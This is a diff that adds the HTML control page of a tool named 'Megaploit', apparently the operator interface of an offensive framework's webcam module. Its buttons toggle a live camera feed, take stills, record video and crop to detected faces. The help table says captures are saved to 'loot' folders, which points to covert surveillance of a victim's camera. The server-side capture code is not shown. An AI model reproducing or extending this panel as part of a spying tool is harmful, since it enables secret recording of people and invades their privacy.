@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Megaploit — Webcam</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body   { background: #0d0d0d; color: #e0e0e0; font-family: "Courier New", monospace;
+             display: flex; flex-direction: column; align-items: center;
+             padding: 24px; gap: 18px; }
+    h1     { font-size: 1rem; letter-spacing: 4px; color: #cc0000; text-transform: uppercase; }
+    .bar   { display: flex; flex-wrap: wrap; gap: 8px; justify-content: center; }
+    button { background: #1a1a1a; color: #e0e0e0; border: 1px solid #333;
+             padding: 6px 18px; cursor: pointer; font-family: inherit;
+             font-size: 0.8rem; letter-spacing: 1px; text-transform: uppercase;
+             transition: background 0.15s; }
+    button:hover { background: #cc0000; color: #fff; border-color: #cc0000; }
+    img    { max-width: 960px; width: 100%; border: 1px solid #222; }
+    table  { font-size: 0.75rem; color: #666; border-collapse: collapse; max-width: 600px; }
+    td     { padding: 3px 12px 3px 0; vertical-align: top; }
+    td:first-child { color: #cc0000; white-space: nowrap; }
+  </style>
+</head>
+<body>
+  <h1>Megaploit &mdash; Webcam Stream</h1>
+
+  <div class="bar">
+    <button onclick="ctrl('toggle_cam')">Stop / Start</button>
+    <button onclick="ctrl('capture')">Capture</button>
+    <button onclick="ctrl('toggle_grey')">Greyscale</button>
+    <button onclick="ctrl('toggle_neg')">Negative</button>
+    <button onclick="ctrl('toggle_face')">Face Only</button>
+    <button onclick="ctrl('toggle_rec')">Record</button>
+  </div>
+
+  <img src="/video_feed" alt="Webcam stream" id="feed">
+
+  <table>
+    <tr><td>Stop/Start</td><td>Toggle the live camera feed on or off</td></tr>
+    <tr><td>Capture</td><td>Save a still frame to loot/screenshots/</td></tr>
+    <tr><td>Greyscale</td><td>Toggle greyscale filter</td></tr>
+    <tr><td>Negative</td><td>Toggle colour-negative filter</td></tr>
+    <tr><td>Face Only</td><td>Crop to detected face (DNN model required)</td></tr>
+    <tr><td>Record</td><td>Toggle video recording to loot/recordings/</td></tr>
+  </table>
+
+  <script>
+    function ctrl(action) {
+      fetch('/control', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: 'action=' + action
+      });
+    }
+  </script>
+</body>
+</html>
